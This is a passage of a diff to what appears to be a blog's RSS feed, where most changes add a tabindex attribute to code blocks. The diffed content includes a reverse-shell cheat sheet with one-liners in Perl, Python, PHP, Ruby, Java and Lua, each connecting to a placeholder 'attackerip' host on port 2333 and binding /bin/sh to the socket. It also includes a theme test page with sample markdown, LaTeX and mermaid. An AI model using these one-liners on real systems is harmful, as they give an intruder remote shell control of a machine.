-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">perl -e &lt;span style="color:#e6db74">&amp;#39;use Socket;$i=&amp;#34;attackerip&amp;#34;;$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;#34;tcp&amp;#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);open(STDOUT,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);open(STDERR,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);exec(&amp;#34;/bin/sh -i&amp;#34;);};&amp;#39;&lt;/span>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">perl -e &lt;span style="color:#e6db74">&amp;#39;use Socket;$i=&amp;#34;attackerip&amp;#34;;$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;#34;tcp&amp;#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);open(STDOUT,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);open(STDERR,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);exec(&amp;#34;/bin/sh -i&amp;#34;);};&amp;#39;&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="python-版本">Python 版本&lt;/h2>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">python -c &lt;span style="color:#e6db74">&amp;#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;attackerip&amp;#34;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;#34;/bin/sh&amp;#34;,&amp;#34;-i&amp;#34;]);&amp;#39;&lt;/span>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">python -c &lt;span style="color:#e6db74">&amp;#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;attackerip&amp;#34;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;#34;/bin/sh&amp;#34;,&amp;#34;-i&amp;#34;]);&amp;#39;&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="php-版本">php 版本&lt;/h2>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">php -r &lt;span style="color:#e6db74">&amp;#39;$sock=fsockopen(&amp;#34;attackerip&amp;#34;,2333);exec(&amp;#34;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;#34;);&amp;#39;&lt;/span>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">php -r &lt;span style="color:#e6db74">&amp;#39;$sock=fsockopen(&amp;#34;attackerip&amp;#34;,2333);exec(&amp;#34;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;#34;);&amp;#39;&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="ruby-版本">Ruby 版本&lt;/h2>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">ruby -rsocket -e&lt;span style="color:#e6db74">&amp;#39;f=TCPSocket.open(&amp;#34;attackerip&amp;#34;,2333).to_i;exec sprintf(&amp;#34;/bin/sh -i &amp;lt;&amp;amp;%d &amp;gt;&amp;amp;%d 2&amp;gt;&amp;amp;%d&amp;#34;,f,f,f)&amp;#39;&lt;/span>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">ruby -rsocket -e&lt;span style="color:#e6db74">&amp;#39;f=TCPSocket.open(&amp;#34;attackerip&amp;#34;,2333).to_i;exec sprintf(&amp;#34;/bin/sh -i &amp;lt;&amp;amp;%d &amp;gt;&amp;amp;%d 2&amp;gt;&amp;amp;%d&amp;#34;,f,f,f)&amp;#39;&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="java-版本">Java 版本&lt;/h2>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">r &lt;span style="color:#f92672">=&lt;/span> Runtime.getRuntime&lt;span style="color:#f92672">()&lt;/span>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">r &lt;span style="color:#f92672">=&lt;/span> Runtime.getRuntime&lt;span style="color:#f92672">()&lt;/span>
 p &lt;span style="color:#f92672">=&lt;/span> r.exec&lt;span style="color:#f92672">([&lt;/span>&lt;span style="color:#e6db74">&amp;#34;/bin/bash&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;-c&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;exec 5&amp;lt;&amp;gt;/dev/tcp/attackerip/2333;cat &amp;lt;&amp;amp;5 | while read line; do \\&lt;/span>$line&lt;span style="color:#e6db74"> 2&amp;gt;&amp;amp;5 &amp;gt;&amp;amp;5; done&amp;#34;&lt;/span>&lt;span style="color:#f92672">]&lt;/span> as String&lt;span style="color:#f92672">[])&lt;/span>
 p.waitFor&lt;span style="color:#f92672">()&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="lua-版本">Lua 版本&lt;/h2>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">lua -e &lt;span style="color:#e6db74">&amp;#34;require(&amp;#39;socket&amp;#39;);require(&amp;#39;os&amp;#39;);t=socket.tcp();t:connect(&amp;#39;attackerip&amp;#39;,&amp;#39;2333&amp;#39;);os.execute(&amp;#39;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;#39;);&amp;#34;&lt;/span>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">lua -e &lt;span style="color:#e6db74">&amp;#34;require(&amp;#39;socket&amp;#39;);require(&amp;#39;os&amp;#39;);t=socket.tcp();t:connect(&amp;#39;attackerip&amp;#39;,&amp;#39;2333&amp;#39;);os.execute(&amp;#39;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;#39;);&amp;#34;&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Test</title><link>https://hare.one/test/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://hare.one/test/</guid><description>&lt;p>这是一个测试页面&lt;/p>
 &lt;h2 id="用于测试博客主题的修改markdown-的样式等">用于测试博客主题的修改、markdown 的样式等&lt;/h2>
 &lt;h2 id="test-1">TEST 1&lt;/h2>
@@ -987,7 +957,7 @@ p.waitFor&lt;span style="color:#f92672">()&lt;/span>
 &lt;h2 id="test-11">TEST 11&lt;/h2>
 &lt;span class="spoiler" >This line has some spoiler text.&lt;/span>
 &lt;h2 id="test-12">TEST 12&lt;/h2>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-plaintext" data-lang="plaintext">Some code text
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-plaintext" data-lang="plaintext">Some code text
 Some code text
 Some code text
 Some code text
@@ -1065,14 +1035,14 @@ Some quote text&lt;/p>
 &lt;h2 id="test-19">TEST 19&lt;/h2>
 &lt;p>$$
 \mathbf{V}_1 \times \mathbf{V}_2 = \begin{vmatrix}
-\mathbf{i} &amp;amp; \mathbf{j} &amp;amp; \mathbf{k} \&lt;br>
-\frac{\partial X}{\partial u} &amp;amp; \frac{\partial Y}{\partial u} &amp;amp; 0 \&lt;br>
-\frac{\partial X}{\partial v} &amp;amp; \frac{\partial Y}{\partial v} &amp;amp; 0 \&lt;br>
+\mathbf{i} &amp;amp; \mathbf{j} &amp;amp; \mathbf{k} \
+\frac{\partial X}{\partial u} &amp;amp; \frac{\partial Y}{\partial u} &amp;amp; 0 \
+\frac{\partial X}{\partial v} &amp;amp; \frac{\partial Y}{\partial v} &amp;amp; 0 \
 \end{vmatrix}
 ${$tep1}{\style{visibility:hidden}{(x+1)(x+1)}}
 $$&lt;/p>
 &lt;h2 id="test-20">TEST 20&lt;/h2>
-&lt;pre>&lt;code class="language-mermaid" data-lang="mermaid">graph LR
+&lt;pre tabindex="0">&lt;code class="language-mermaid" data-lang="mermaid">graph LR
 A[方形] --&amp;gt;B(圆角)
 B --&amp;gt; C{条件a}
 C --&amp;gt;|a=1| D[结果1]
